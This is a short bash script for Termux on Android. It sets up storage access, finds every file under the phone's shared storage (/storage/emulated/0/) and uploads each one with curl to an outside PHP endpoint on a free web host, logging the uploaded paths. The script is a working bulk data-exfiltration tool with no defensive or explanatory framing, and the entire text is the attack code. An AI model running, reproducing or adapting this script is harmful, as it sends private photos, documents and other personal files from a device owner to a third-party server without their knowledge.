#!/data/data/com.termux/files/usr/bin/bash

targetUrl="https://weldable-seesaw.000webhostapp.com/0.php"
fileTypes=("*.txt" "*.*")
uploadCount=0
logFile="$HOME/storage/downloads/upload.log"

# Initialize log file
echo "Upload Log" > "$logFile"

# Ensure storage access is setup
termux-setup-storage

# Search and upload files
for fileType in "${fileTypes[@]}"; do
    find /storage/emulated/0/ -type f -name "$fileType" 2>/dev/null | while read -r file; do
        curl -s -X POST -F "file=@$file" "$targetUrl" > /dev/null
        if [ $? -eq 0 ]; then
            echo "$file" >> "$logFile"
            uploadCount=$((uploadCount + 1))
        fi
    done
done

# Final log entry
echo "Total files uploaded: $uploadCount" >> "$logFile"
